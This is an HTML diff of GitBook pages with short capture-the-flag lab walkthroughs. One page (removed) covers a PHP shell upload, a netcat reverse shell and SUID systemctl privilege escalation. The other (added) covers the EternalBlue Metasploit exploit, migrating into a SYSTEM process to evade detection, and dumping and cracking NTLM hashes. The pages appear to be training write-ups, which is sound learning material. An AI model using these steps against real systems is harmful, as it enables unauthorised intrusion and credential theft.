@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Vulnversity · GitBook</title>
+        <title>Blue · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,8 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="blue.html" />
     
-    
-    <link rel="prev" href="./" />
+    <link rel="prev" href="vulnversity.html" />
     
 
     </head>
@@ -116,7 +114,7 @@
             <ul class="articles">
                 
     
-        <li class="chapter active" data-level="1.2.1" data-path="vulnversity.html">
+        <li class="chapter " data-level="1.2.1" data-path="vulnversity.html">
             
                 <a href="vulnversity.html">
             
@@ -129,7 +127,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.2.2" data-path="blue.html">
+        <li class="chapter active" data-level="1.2.2" data-path="blue.html">
             
                 <a href="blue.html">
             
@@ -177,7 +175,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Vulnversity</a>
+        <a href=".." >Blue</a>
     </h1>
 </div>
 
@@ -192,38 +190,38 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="vulnversity">Vulnversity</h1>
+                                <h1 id="blue">Blue</h1>
 <p>Tasks:</p>
 <ol>
-<li>Deploy the machine.</li>
-<li>Reconnaissance:<ol>
-<li>Do nmap version scan , find port used by apache and also OS(Ubuntu)</li>
-<li>Answer all questions based on nmap output.</li>
-</ol>
-</li>
-<li>Locating directories using GoBuster:<ol>
-<li>Use gobuster to bruteforce directories using any directory word list, There will be /internal/ directory.</li>
-<li>/internal/ directory has file upload functionality.</li>
-</ol>
-</li>
-<li>Compromise the webserver:<ol>
-<li>Try to upload php shell with various extensions such as .php,.php3,.php4,.php5,.phtml - only .phtml succeeds.</li>
-<li>Do one more directory search in /internal/ directory - You will find /internal/uploads/ directory which has uploaded shell in it.</li>
-<li>Connect to reverse shell by using nc in linux or ncat in windows - You have got local access to machine now . (you answer all the questions in the task now after cd to /home/ directory)</li>
-</ol>
-</li>
-<li>Privilege Escalation:<ol>
-<li>Search for binaries with suid permission</li>
-<li>systemctl has suid permission</li>
-<li>make a service which copies /root/root.txt to /tmp/ or make a service which startes reverse  shell to attacker machine, make sure User is set as root for service.</li>
-<li>Enable and start the service using systemctl - you are now root !!!</li>
-<li>Report root flag in /tmp/root.txt or /root/root.txt(reverse shell case).</li>
+<li>Recon:<ol>
+<li>Do nmap version scan along with vuln script to find vulnerability<ol>
+<li><code>nmap -sV --script vuln ip</code></li>
+<li>Vulnerable to CVE-2017-0143 or ms17-010 found.[Eternal Blue] from nmap results - Answer all questions based on this output.</li>
 </ol>
 </li>
 </ol>
-<p>References:</p>
-<ol>
-<li><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" target="_blank">https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</a></li>
+</li>
+<li>Gain Access:<ol>
+<li>Start metasploit console , search ms17-010, use exploit/windows/smb/ms17_010_eternalblue, set RHOSTS to victim ip and run.</li>
+<li>Background session by pressing ctrl+z</li>
+</ol>
+</li>
+<li>Escalate:<ol>
+<li>Convert shell to meterpreter: use post/multi/manage/shell_to_meterpreter , SET LHOST to attacker ip and SESSION (backgrounded session id , use sessions -l to list sessions).</li>
+<li>Execute <strong>run</strong>  to get meterpreter session and run <strong>sessions -i meterpreter_</strong><em><strong>session_id</strong> to switch to meterpreter session. Run </em><strong>getsystem</strong> to verify we got system access and are NT AUTHORITY\SYSTEM indeed.</li>
+<li>Use ps to list all process, migrate to any process running as system using <strong>migrate pid, </strong>we are injecting our meterpreter in running process to get stable and make our shell less detective.</li>
+</ol>
+</li>
+<li>Cracking:<ol>
+<li>type hashdump in meterpreter session and obtain NTLM credential hash dump.</li>
+<li>Use <a href="https://crackstation.net" target="_blank">crackstation</a>, john or hashcat to get password of Jon.</li>
+</ol>
+</li>
+<li>Find flags!:<ol>
+<li>run <strong>search -f flag*</strong> in meterpreter session, you will find location of flags.</li>
+<li>Do cat location__of__flag for all 3 flag locations and submit the flags !!!</li>
+</ol>
+</li>
 </ol>
 
                                 
@@ -252,14 +250,10 @@
 
             
                 
-                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Getting Started">
+                <a href="vulnversity.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Vulnversity">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
-                
-                <a href="blue.html" class="navigation navigation-next " aria-label="Next page: Blue">
-                    <i class="fa fa-angle-right"></i>
-                </a>
                 
             
         
@@ -268,7 +262,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Vulnversity","level":"1.2.1","depth":2,"next":{"title":"Blue","level":"1.2.2","depth":2,"path":"getting-started/blue.md","ref":"getting-started/blue.md","articles":[]},"previous":{"title":"Getting Started","level":"1.2","depth":1,"path":"getting-started/README.md","ref":"getting-started/README.md","articles":[{"title":"Vulnversity","level":"1.2.1","depth":2,"path":"getting-started/vulnversity.md","ref":"getting-started/vulnversity.md","articles":[]},{"title":"Blue","level":"1.2.2","depth":2,"path":"getting-started/blue.md","ref":"getting-started/blue.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"getting-started/vulnversity.md","mtime":"2021-10-19T11:45:31.613Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-10-19T11:46:10.330Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Blue","level":"1.2.2","depth":2,"previous":{"title":"Vulnversity","level":"1.2.1","depth":2,"path":"getting-started/vulnversity.md","ref":"getting-started/vulnversity.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"getting-started/blue.md","mtime":"2021-10-19T11:45:31.613Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-10-19T11:46:10.330Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
